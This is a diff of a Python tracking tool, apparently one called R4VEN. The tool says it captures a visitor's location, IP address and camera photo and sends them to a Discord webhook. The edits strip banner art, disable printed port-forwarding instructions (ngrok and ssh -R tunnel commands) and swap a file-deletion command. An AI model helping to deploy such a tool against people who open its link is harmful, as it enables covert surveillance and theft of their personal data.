@@ -44,13 +44,7 @@ if sys.stdout.isatty():
 else:
     R = G = C = W = Y = ''
 
-banner = r'''                                                    
-__________    _________   _______________ _______   
-\______   \  /  |  \   \ /   /\_   _____/ \      \  
- |       _/ /   |  |\   Y   /  |    __)_  /   |   \ 
- |    |   \/    ^   /\     /   |        \/    |    \
- |____|_  /\____   |  \___/   /_______  /\____|__  /
-        \/      |__|                  \/         \/ 
+banner = r'''
 Track device location, and IP address, and capture a photo with device details.
 
 '''
@@ -115,7 +109,7 @@ def main():
 def print_banners():
     """
     prints the program banners
-    """
+
     print(f'{R}{banner}{W}')
     print(f'{G}[+] {C}Version      : {W}{VERSION}')
     print(f'{G}[+] {C}Created By   : {W}Spyboy')
@@ -125,24 +119,22 @@ def print_banners():
     print(f'{G} ╰➤ {C}Blog         : {W}{blog}')
     print(f'{G} ╰➤ {C}Github       : {W}{github}\n')
 
+    """
 
 def print_port_forwarding_instructions():
     """
     prints the port forwarding instruction
+
+    #print(f'\n{R}NOTE: {Y}Make sure you port forward else it will not work on the smartphone browser \n')
+    #print(f'{R}[!] {G}To Port Forward Install Ngrok Or Use SSH')
+    #print(f'{W}Open New Tab/Window In Your Terminal.')
+    #print(f'{C}For ngrok port forward type  : {Y}ngrok http 8000')
+    #print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localhost.run')
+    #print(f'{W}OR you can use whatever tool you want to port forward with.\n')
     """
-    print(f'\n{R}NOTE: {Y}Make sure you port forward else it will not work on the smartphone browser \n')
-    print(f'{R}[!] {G}To Port Forward Install Ngrok Or Use SSH')
-    print(f'{W}Open New Tab/Window In Your Terminal.')
-    print(f'{C}For ngrok port forward type  : {Y}ngrok http 8000')
-    print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localhost.run')
-    print(f'{W}OR you can use whatever tool you want to port forward with.\n')
 
     banner3 = r'''
     Track info will be sent to your discord webhook
-          ----
-    (\__/) || 
-    (•ㅅ•) || 
-    / 　 づ
 
     '''
 
@@ -165,7 +157,7 @@ def remove_old_discord_webhook():
     removes the old discord webhook
     """
     try:
-        os.system("rm dwebhook.js")
+        os.system("del dwebhook.js")
     except:
         pass
 
